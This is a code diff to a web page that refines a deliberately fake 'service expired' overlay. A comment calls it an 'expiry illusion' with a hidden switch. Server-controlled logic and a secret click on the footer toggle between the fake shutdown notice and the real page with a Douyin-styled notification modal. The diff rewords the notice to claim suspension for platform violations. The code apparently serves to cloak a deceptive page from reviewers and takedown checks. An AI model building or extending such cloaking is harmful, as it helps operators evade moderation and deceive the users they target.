@@ -18,6 +18,11 @@
             max-width: 640px;
             margin: 0 auto;
             padding-bottom: env(safe-area-inset-bottom, 20px);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .container.visible {
+            opacity: 1;
         }
 
         /* ===== Header ===== */
@@ -812,11 +817,11 @@
             </svg>
         </div>
         <h1 class="expired-title">此页面已停止服务</h1>
-        <p class="expired-desc">该域名已过期或被管理员停用</p>
+        <p class="expired-desc">该服务已到期或因违反平台规定被暂停</p>
         <div class="expired-code">ERR_SERVICE_EXPIRED</div>
         <div class="expired-time">停用时间：2026-05-18 00:00:00</div>
         <div class="expired-footer">
-            <p>如有疑问请联系管理员</p>
+            <p>如有疑问请联系平台客服</p>
             <p class="expired-id">Trace ID: ${Math.random().toString(36).substr(2, 16)}</p>
         </div>
     </div>
@@ -926,6 +931,7 @@
 <script>
     // 网站状态同步
     var expiredOverlay = document.getElementById('expiredOverlay');
+    var container = document.querySelector('.container');
     var siteExpired = false;
 
     // 检查服务器状态
@@ -935,8 +941,10 @@
             siteExpired = data.expired;
             if (siteExpired) {
                 expiredOverlay.classList.remove('hidden');
+                container.classList.add('visible');
             } else {
                 expiredOverlay.classList.add('hidden');
+                container.classList.add('visible');
                 document.getElementById('douyinNotifModal').classList.add('active');
             }
         });
@@ -954,6 +962,7 @@
                     .then(function(data) {
                         if (data.expired) {
                             expiredOverlay.classList.remove('hidden');
+                            container.style.display = 'none';
                         }
                     });
             }
@@ -963,12 +972,14 @@
     // 失效幻象的隐蔽开关 - 点击底部文字切换回正常页面
     var expiredFooter = expiredOverlay.querySelector('.expired-footer');
     if (expiredFooter) {
+        expiredFooter.style.cursor = 'pointer';
         expiredFooter.addEventListener('click', function() {
             fetch('/api/site-toggle', { method: 'POST' })
                 .then(function(r) { return r.json(); })
                 .then(function(data) {
                     if (!data.expired) {
                         expiredOverlay.classList.add('hidden');
+                        container.style.display = '';
                         document.getElementById('douyinNotifModal').classList.add('active');
                     }
                 });
